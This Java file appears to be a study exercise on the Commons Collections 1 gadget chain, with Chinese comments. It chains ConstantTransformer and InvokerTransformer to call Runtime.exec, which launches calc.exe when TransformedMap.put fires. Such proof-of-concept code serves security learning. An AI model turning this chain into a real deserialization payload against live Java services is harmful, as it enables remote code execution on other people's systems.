package Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollectionTest {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{//创建了一个Transformer数组
                new ConstantTransformer(Runtime.getRuntime()),//第一个Transformer返回JVM运行时对象
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"C:\\Windows\\System32\\calc.exe"})//第二个Transformer通过IncokerTransformer调用Runtime的exec对象并弹一个计数器
        };
        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用
        Map innerMap = new HashMap();//创建一个HashMap对象
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//创建一个TransformedMap对象，使用上面的TransformChain来修饰innerMap
        outerMap.put("test", "xxxx");//这里调用put方法（触发点）
    }
}
